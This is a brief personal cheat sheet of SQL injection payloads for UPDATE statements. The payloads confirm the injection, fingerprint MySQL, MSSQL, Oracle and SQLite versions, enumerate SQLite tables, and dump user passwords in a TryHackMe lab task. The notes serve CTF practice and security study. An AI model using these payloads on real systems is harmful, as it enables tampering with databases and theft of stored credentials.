# SQLnotes
just notes on SQLi

CHECKING FOR UPDATE SQLI:

asd',COLUMN-NAME='test',COLUMN-NAME='hacked


IDENTIFYING DATABASE BY UPDATE:
# For MySQL and MSSQL
',COLUMN-NAME=@@version,COLUMN-NAME='
# For Oracle
',COLUMN-NAME=(SELECT banner FROM v$version),COLUMN-NAME='
# For SQLite
',COLUMN-NAME=sqlite_version(),COLUMN-NAME='



ENUMERATING SQLite for tables and columns:
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='

',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='

DUMPING TABLE INFO: BASED ON A SPECIFIC TABLE FOR CTF: SQLi Into TryHackMe; TASK3
',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
